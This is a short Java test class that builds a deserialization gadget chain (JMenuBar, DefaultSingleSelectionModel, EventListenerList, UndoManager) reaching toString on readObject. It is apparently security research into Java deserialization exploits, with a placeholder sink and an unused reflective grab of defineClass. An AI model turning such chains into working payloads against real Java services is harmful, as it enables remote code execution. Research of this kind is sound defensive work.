package readObject2toString;

import javafx.scene.control.SingleSelectionModel;
import pojo.EqualsClass;
import pojo.ToStringClass;
import pojo.Tools;

import javax.swing.*;
import javax.swing.event.ChangeEvent;
import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.lang.reflect.Method;
import java.util.Vector;

public class Test01 {
    public static void main(String[] args) throws Exception {
        JMenuBar jMenuBar = new JMenuBar();
//        EqualsClass equalsClass = new EqualsClass();
        ToStringClass toStringClass = new ToStringClass();
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) Tools.getFieldValue(manager, "edits");
        vector.add(toStringClass);
        Tools.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});

        DefaultSingleSelectionModel defaultSingleSelectionModel = new DefaultSingleSelectionModel();
        Tools.setFieldValue(defaultSingleSelectionModel, "changeEvent", new ChangeEvent("test"));
        Tools.setFieldValue(defaultSingleSelectionModel, "listenerList", list);
        Tools.setFieldValue(jMenuBar, "selectionModel", defaultSingleSelectionModel);


        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        byte[] ser = Tools.ser(jMenuBar);
        Object deser = Tools.deser(ser);

    }
}
